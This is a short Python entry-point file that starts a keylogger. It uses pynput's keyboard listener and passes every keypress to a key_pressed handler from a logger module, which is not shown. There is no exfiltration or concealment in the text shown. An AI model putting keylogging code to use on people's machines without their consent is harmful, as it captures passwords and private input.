# main.py

from pynput import keyboard
from logger import key_pressed

def main():
    """Start the keylogger."""
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    print("Keylogger started. Press ESC to stop.")
    listener.join()  # This will block until the listener stops

if __name__ == "__main__":
    main()